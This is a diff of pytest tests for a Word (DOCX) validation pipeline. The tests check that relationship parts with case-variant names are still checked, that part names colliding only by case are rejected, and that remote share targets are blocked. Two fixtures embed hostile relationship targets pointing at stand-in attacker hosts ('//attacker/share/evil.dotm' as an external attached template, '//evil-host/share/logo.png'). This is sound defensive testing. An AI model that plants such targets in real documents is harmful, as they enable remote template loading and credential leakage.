@@ -338,3 +338,55 @@ def test_docx_reaches_converter_as_exact_authoritative_bytes(tmp_path: Path) -> 
     assert spy.received is not None
     assert spy.received[1] == "DOCX"
     assert spy.received[0] == authoritative
+
+
+# --- Phase C §27: OPC part names compare case-insensitively ---
+
+
+@pytest.mark.parametrize("name", ("word/_rels/settings.xml.RELS", "word/_rels/settings.xml.Rels"))
+def test_case_variant_relationship_part_is_still_swept(tmp_path: Path, name: str) -> None:
+    """P0: a ".RELS" part is the same part to Word, and bypassed the whole policy."""
+    parts = _minimal_docx_parts()
+    parts[name] = (
+        f'<Relationships xmlns="{_TRANSITIONAL_RELS_NS}">'
+        '<Relationship Id="rIdT" Type="http://schemas.openxmlformats.org/officeDocument/'
+        '2006/relationships/attachedTemplate" Target="//attacker/share/evil.dotm" '
+        'TargetMode="External"/></Relationships>'
+    )
+    source = _write_package(tmp_path / "source.docx", parts)
+    with pytest.raises(ValueError):
+        office_word_worker._validate_word_source(source, "DOCX")
+
+    with pytest.raises(ValueError):
+        delivery_renderer.validate_final_artifact(source.read_bytes(), "DOCX")
+
+
+def test_part_names_colliding_only_by_case_are_rejected(tmp_path: Path) -> None:
+    parts = _minimal_docx_parts()
+    parts["word/Document.xml"] = _document()
+    source = _write_package(tmp_path / "source.docx", parts)
+    with pytest.raises(ValueError, match="duplicate Word package part"):
+        office_word_worker._validate_word_source(source, "DOCX")
+
+
+def test_delivery_rejects_a_local_target_declared_internal(tmp_path: Path) -> None:
+    """The delivered artifact must not carry a target that resolves off-box."""
+    parts = _minimal_docx_parts()
+    parts["word/_rels/document.xml.rels"] = (
+        f'<Relationships xmlns="{_TRANSITIONAL_RELS_NS}">'
+        '<Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/'
+        '2006/relationships/image" Target="//evil-host/share/logo.png" '
+        'TargetMode="Internal"/></Relationships>'
+    )
+    content = _write_package(tmp_path / "delivery.docx", parts).read_bytes()
+    with pytest.raises(ValueError, match="external relationships"):
+        delivery_renderer.validate_final_artifact(content, "DOCX")
+
+
+def test_zip_directory_entries_do_not_read_as_undeclared(tmp_path: Path) -> None:
+    source = tmp_path / "source.docx"
+    with ZipFile(source, "w", ZIP_DEFLATED) as package:
+        for name, value in _minimal_docx_parts().items():
+            package.writestr(name, value)
+        package.writestr("word/", "")
+    office_word_worker._validate_word_source(source, "DOCX")
